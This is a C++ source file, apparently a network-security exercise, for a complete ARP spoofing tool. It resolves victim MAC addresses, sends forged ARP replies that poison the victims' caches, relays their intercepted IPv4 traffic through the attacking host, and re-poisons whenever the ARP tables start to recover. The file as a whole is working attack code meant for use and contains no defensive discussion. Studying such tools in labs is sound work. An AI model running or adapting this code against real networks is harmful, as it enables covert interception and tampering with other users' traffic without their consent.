#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Session final {
	Ip senderIp_;
	Mac senderMac_;
	Ip targetIp_;
	Mac targetMac_;
};

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac getMac(const char* iface) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		fprintf(stderr, "socket error\n");
		return Mac::nullMac();
	}

	struct ifreq ifr;
	std::memset(&ifr, 0, sizeof(ifr));
	std::strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
		fprintf(stderr, "interface error: %s\n", iface);
		close(fd);
		return Mac::nullMac();
	}

	const uint8_t* mac = reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data);
	Mac result(mac);

	close(fd);
	return result;
}

Ip getIp(const char* iface) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		fprintf(stderr, "socket error\n");
		return Ip("0.0.0.0");
	}

	struct ifreq ifr;
	std::memset(&ifr, 0, sizeof(ifr));
	std::strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
		fprintf(stderr, "could not get IP\n");
		close(fd);
		return Ip("0.0.0.0");
	}

	const sockaddr_in* address = reinterpret_cast<const sockaddr_in*>(&ifr.ifr_addr);
	Ip ip(ntohl(address->sin_addr.s_addr));
	close(fd);
	return ip;
}
	

bool sendArpRequest(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Ip& attackerIp,
	const Ip& senderIp
) {
	EthArpPacket packet{};

	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(senderIp);

	int result = pcap_sendpacket(
		pcap,
		reinterpret_cast<const u_char*>(&packet),
		sizeof(EthArpPacket)
	);

	if (result != 0) {
        fprintf(stderr, "failed to send ARP request");
		return false;
	}

	return true;
}

Mac resolveMac(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Ip& attackerIp,
	const Ip& senderIp
) {
	for (int attempt = 0; attempt < 3; attempt++) {
		if (!sendArpRequest(pcap, attackerMac, attackerIp, senderIp)) {
			return Mac::nullMac();
		}

		for (int readCount = 0; readCount < 3000; readCount++) {
			struct pcap_pkthdr* header;
			const u_char* rawPacket;

			int result = pcap_next_ex(pcap, &header, &rawPacket);

			if (result == 0) {
				continue;
			}

			if (result == -1) {
				fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
				return Mac::nullMac();
			}

			if (result == -2) {
				return Mac::nullMac();
			}

			if (header->caplen < sizeof(EthArpPacket)) {
				continue;
			}

			const EthArpPacket* packet =
				reinterpret_cast<const EthArpPacket*>(rawPacket);

			if (ntohs(packet->eth_.type_) != EthHdr::Arp) {
				continue;
			}

			if (ntohs(packet->arp_.hrd_) != ArpHdr::ETHER ||
				ntohs(packet->arp_.pro_) != EthHdr::Ip4 ||
				packet->arp_.hln_ != Mac::Size ||
				packet->arp_.pln_ != Ip::Size) {
				continue;
			}

			if (ntohs(packet->arp_.op_) != ArpHdr::Reply) {
				continue;
			}

			Ip replySenderIp(ntohl(packet->arp_.sip_));
			Ip replyTargetIp(ntohl(packet->arp_.tip_));

			if (!(replySenderIp == senderIp)) {
				continue;
			}

			if (!(replyTargetIp == attackerIp)) {
				continue;
			}

			if (!(packet->arp_.tmac_ == attackerMac)) {
				continue;
			}

			return packet->arp_.smac_;
		}
	}

	fprintf(stderr, "could not find MAC\n");
	return Mac::nullMac();
}

bool sendArpInfection(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Mac& senderMac,
	const Ip& senderIp,
	const Ip& targetIp
) {
	EthArpPacket packet{};

	packet.eth_.dmac_ = senderMac;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(targetIp);
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(senderIp);

	int result = pcap_sendpacket(
		pcap,
		reinterpret_cast<const u_char*>(&packet),
		sizeof(EthArpPacket)
	);

	if (result != 0) {
        fprintf(stderr, "coudl not send arp infection\n");
		return false;
	}

	return true;
}

bool relay(pcap_t* pcap, const u_char* rawPacket, bpf_u_int32 length, const Mac& attackerMac, const Session& session) {
	u_char* packet = new u_char[length];
	std::memcpy(packet, rawPacket, length);

	EthHdr* eth = reinterpret_cast<EthHdr*>(packet);
	eth->smac_ = attackerMac;
	eth->dmac_ = session.targetMac_;

	int result = pcap_sendpacket(pcap, packet, length);
	delete[] packet;

	if (result != 0) {
		fprintf(stderr, "failed to relay\n");
		return false;
	}
	return true;
}

bool isRecoveryPacket(
	const EthArpPacket* packet,
	const Mac& attackerMac,
	const Session& session
) {
	if (packet->eth_.smac_ == attackerMac)
		return false;

	uint16_t operation = ntohs(packet->arp_.op_);
	Ip arpSenderIp(ntohl(packet->arp_.sip_));
	Ip arpTargetIp(ntohl(packet->arp_.tip_));

	if (operation == ArpHdr::Request) {
		return (arpSenderIp == session.senderIp_ &&
				arpTargetIp == session.targetIp_) ||
			(arpSenderIp == session.targetIp_ &&
				arpTargetIp == session.senderIp_);
	}

	return operation == ArpHdr::Reply &&
		arpSenderIp == session.targetIp_ &&
		arpTargetIp == session.senderIp_ &&
		packet->arp_.smac_ != attackerMac;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return 1;
	}

	char* interface = argv[1];
	Mac attackerMac = getMac(interface);
	Ip attackerIp = getIp(interface);

	if (attackerMac.isNull() || attackerIp == Ip("0.0.0.0")) {
		fprintf(stderr, "could not get Attacker information\n");
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);

	if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device\n");
		return 1;
	}

	if (pcap_datalink(pcap) != DLT_EN10MB) {
        fprintf(stderr, "unsupported data-link type\n");
		pcap_close(pcap);
		return 1;
	}

	
	int sessionCount = (argc - 2) / 2;
	Session* sessions = new Session[sessionCount];

	for (int i = 0; i < sessionCount; ++i) { 
		sessions[i].senderIp_ = Ip(argv[i * 2 + 2]); 
		sessions[i].targetIp_ = Ip(argv[i * 2 + 3]); 

		sessions[i].senderMac_ = resolveMac( 
			pcap, attackerMac, attackerIp, sessions[i].senderIp_); 
		sessions[i].targetMac_ = resolveMac( 
			pcap, attackerMac, attackerIp, sessions[i].targetIp_); 

		if (sessions[i].senderMac_.isNull() || 
			sessions[i].targetMac_.isNull()) {
			delete[] sessions; 
			pcap_close(pcap); 
			return 1; 
		}
	}

	for (int i = 0; i < sessionCount; ++i) { 
		if (!sendArpInfection(
				pcap,
				attackerMac,
				sessions[i].senderMac_,
				sessions[i].senderIp_,
				sessions[i].targetIp_)) {
			delete[] sessions;
			pcap_close(pcap); 
			return 1;
		} 
	}


	while (true) { 
		struct pcap_pkthdr* header; 
		const u_char* rawPacket; 
		int result = pcap_next_ex(pcap, &header, &rawPacket);

		if (result == -1) { 
			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap)); 
			break; 
		} 
		if (result == -2) 
			break; 

		if (result == 0) 
			continue; 
		if (header->caplen < sizeof(EthHdr)) 
			continue; 

		const EthHdr* eth = reinterpret_cast<const EthHdr*>(rawPacket);
		uint16_t etherType = ntohs(eth->type_); 

		if (etherType == EthHdr::Ip4) { 
			if (header->caplen != header->len)
				continue; 

			for (int i = 0; i < sessionCount; ++i) { 
				if (eth->smac_ == sessions[i].senderMac_ && 
					eth->dmac_ == attackerMac) { 
					relay(pcap, rawPacket, header->caplen,
						attackerMac, sessions[i]); 
					break; 
				} 
			} 
			continue;
		}

		if (etherType != EthHdr::Arp || 
			header->caplen < sizeof(EthArpPacket)) 
			continue; 

		const EthArpPacket* arpPacket = 
			reinterpret_cast<const EthArpPacket*>(rawPacket); 

		if (ntohs(arpPacket->arp_.hrd_) != ArpHdr::ETHER || 
			ntohs(arpPacket->arp_.pro_) != EthHdr::Ip4 ||
			arpPacket->arp_.hln_ != Mac::Size || 
			arpPacket->arp_.pln_ != Ip::Size)
			continue;

		for (int i = 0; i < sessionCount; ++i) {
			if (isRecoveryPacket(arpPacket, attackerMac, sessions[i]))
				sendArpInfection(
					pcap,
					attackerMac,
					sessions[i].senderMac_,
					sessions[i].senderIp_,
					sessions[i].targetIp_);
		}
	}

	delete[] sessions;
	pcap_close(pcap);
	return 0;
}
